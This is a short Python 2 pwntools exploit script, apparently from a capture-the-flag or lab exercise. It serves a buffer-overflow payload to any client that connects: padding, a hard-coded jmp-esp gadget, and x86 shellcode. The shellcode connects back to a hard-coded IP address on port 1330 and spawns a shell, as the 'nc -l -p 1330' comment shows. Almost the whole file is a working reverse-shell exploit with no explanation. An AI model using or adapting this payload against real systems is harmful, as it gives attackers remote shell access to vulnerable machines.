from pwn import *

# nc -l -p 1330

l = listen(port = 1337)
c = l.wait_for_connection()

sh = """
push   0x0
push   0x1
push   0x2
push   0x66
pop    eax
push   0x1
pop    ebx
mov    ecx,esp
int    0x80
push   0x88bd738c
push   0x32050002
mov    ecx,esp
push   0x10
push   ecx
push   eax
mov    al,0x66
push   0x3
pop    ebx
mov    ecx,esp
int    0x80
"""

ss = asm(sh)
ss += asm(shellcraft.dup2(0,1))
ss += asm(shellcraft.sh())

jmp_esp = 0x80bd13b

a = raw_input('>>>')

p = 'a' * 12
p += p32(jmp_esp)
p += ss

print len(p)

c.send(p)
